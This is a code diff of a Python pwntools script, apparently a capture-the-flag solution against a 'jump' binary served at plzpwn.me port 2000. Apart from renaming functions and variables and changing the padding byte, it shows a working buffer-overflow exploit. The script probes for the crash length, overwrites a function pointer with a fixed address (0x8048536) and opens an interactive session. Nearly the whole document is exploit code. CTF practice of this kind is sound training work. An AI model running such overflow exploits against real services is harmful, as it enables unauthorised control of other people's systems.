@@ -7,11 +7,11 @@ REMOTE = 1
 OFFSET = 16
 
 
-def p_beg():
+def io_beg():
 	return remote('plzpwn.me', 2000)
 	#process('./jump')
 	
-def p_rdy(x):
+def io_rdy(x):
 	return x.recvuntil("Do you remember how function pointers work ?".encode(ENCODING), timeout = 10).decode(ENCODING)
 
 def segfault_wrap(tries = 2):
@@ -35,17 +35,17 @@ def segfault_wrap(tries = 2):
 		
 		
 
-def segfault_inc(lam_beg = lambda: p_beg(), lam_rdy = lambda x: p_rdy(x), max = 100, bad_magic = "ault", good_magic = "------"):
+def segfault_inc(lam_beg = lambda: io_beg(), lam_rdy = lambda x: io_rdy(x), max = 100, bad_magic = "ault", good_magic = "------"):
 	soup = ""
 	entry = 1
 		
 	while(entry <= max):
 		soup = soup + chr(entry+OFFSET)
 		
-		p = lam_beg()
-		lam_rdy(p)
-		p.sendline(soup.encode(ENCODING))
-		inbound = p.recvall(timeout=5).decode(ENCODING)
+		io = lam_beg()
+		lam_rdy(io)
+		io.sendline(soup.encode(ENCODING))
+		inbound = io.recvall(timeout=5).decode(ENCODING)
 		print(inbound)
 		
 		# any remote
@@ -53,7 +53,7 @@ def segfault_inc(lam_beg = lambda: p_beg(), lam_rdy = lambda x: p_rdy(x), max = 
 			return (entry)
 		
 		if(not(REMOTE)):
-			if(p.poll() != 0):
+			if(io.poll() != 0):
 				return entry
 
 		if(REMOTE):
@@ -74,20 +74,20 @@ def main():
 			stage = stage + 1
 		elif(stage == 1):
 			seg = seg # - padd
-			p = p_beg()
-			p_rdy(p)
-			fill = b'\x37'*seg
+			io = io_beg()
+			io_rdy(io)
+			fill = b'\x00'*seg
 			payload = p32(0x8048536)
 			
 			
 			print("Fill: "+fill.decode(ENCODING))
 			print("Payload: "+str(payload))
 
-			p.send_raw(fill+payload) # win
-			p.sendline(b'') # fire!
+			io.send_raw(fill+payload) # win
+			io.sendline(b'') # fire!
 			
-			print(p.recv(200, timeout = 5))
-			p.interactive()
+			print(io.recv(200, timeout = 5))
+			io.interactive()
 			stage = stage + 1
 		else:
 			print("Weird flex, exiting")
